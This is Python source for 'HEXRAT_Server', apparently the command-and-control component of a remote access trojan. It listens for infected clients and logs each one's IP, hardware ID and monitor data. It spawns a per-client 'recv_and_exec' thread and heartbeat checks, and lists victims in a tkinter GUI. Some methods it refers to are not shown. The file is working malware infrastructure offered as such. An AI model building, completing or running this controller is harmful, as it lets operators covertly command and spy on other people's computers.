import socket
import customtkinter
import threading
import time
import json
import os
import sys
import select
import datetime
import queue
from src.HexFunc import debug
import tkinter as tk
from PIL import Image
class HEXRAT_Server:
	def __init__(self, ip: str, port: int) -> None:
		self.ip = ip
		self.port = port
		self.socket = socket.socket()
		self.socket.bind((self.ip, self.port))
		self.socket.listen(1)
		self.ids = 0
		self.delay = 1
		self.global_vars = {'sock_obj': [],'address': [],'threads': [],'status': False, 'hwid': [], 'monitors': [], 'stream': [], 'files': []}
		self.queue = queue.Queue()
		self.active = False
		
	def initialize_server(self):
		if not self.global_vars['status']:
			self.global_vars['status'] = True
			self.listener()
		else:
			debug("Server is already active")

	def get_contents(self, contents) -> dict:
		data = json.loads(contents)
		return data['hwid'], data['monitors']

	def recvall(self, connection):
		try:
			data = bytearray()
			length = b""
			while True:
				packet_len = connection.recv(1)
				if packet_len != b" ":
					length += packet_len
				else:
					break
			length = int(length)
			while len(data) < length:
				packet = connection.recv(length - len(data))
				if not packet:
					return None
				data += packet
			return data
		except Exception as e:
			debug(e)

	def send(self, packet, conn):
		conn.sendall(str(len(packet)).encode('utf-8') + b' ' + packet)

	def listener(self):
		debug("Server is running on {}:{}".format(self.ip,self.port))
		while self.global_vars['status']:
			try:
				server_socket = [self.socket]
				ready, _, _ = select.select(server_socket, [], [], 1)
				if ready:
					conn, addr = self.socket.accept()

					self.root_tk = tk.Tk()
					self.frame = tk.Frame(self.root_tk, bg='grey')
					self.terminal_window = tk.Text(self.frame, height=20, width=80, bg='black', fg='white', insertbackground='white', state="disabled")
					debug("CLIENT CONNECTED -> {}:{}".format(addr[0],addr[1]))
					contents = self.get_contents(self.recvall(conn))
					client_id = len(self.global_vars["address"])
					self.global_vars["sock_obj"].append(conn)
					self.global_vars["address"].append(addr)
					self.global_vars['hwid'].append(contents[0])
					self.global_vars['stream'].append(False)
					self.global_vars['monitors'].append(contents[1])
					a = threading.Thread(target=self.recv_and_exec, args=(conn,client_id,))
					self.global_vars["threads"].append(a)
					a.start()
					self.treeview.insert('', "end", str(client_id), values=(client_id,) + self.global_vars["address"][client_id] + (contents))
					a = threading.Thread(target=self.heartbeat, args=(client_id, conn, client_id))
					self.global_vars['threads'].append(a)
					a.start()
			except Exception as e:
				debug(e)
		time.sleep(1)


	def heartbeat(self, client_id, conn, addr):
		# This function checks if the client is alive or not by sending Alive?
		while self.global_vars['status']:
			try:
				self.send(b'Alive', conn)
				# debug('Pinged {}:{} successfully'.format(addr[0],addr[1]))
				time.sleep(self.delay)
			except Exception as e:
				client_info = self.global_vars["address"][client_id]
				debug("Client ID: {} -> {}:{} has disconnected".format(client_id, client_info[0], client_info[1]))
				self.global_vars["sock_obj"][client_id] = ''
				self.global_vars["address"][client_id] = ''
				self.treeview.delete(str(client_id))
				break
		self.ids -= 1
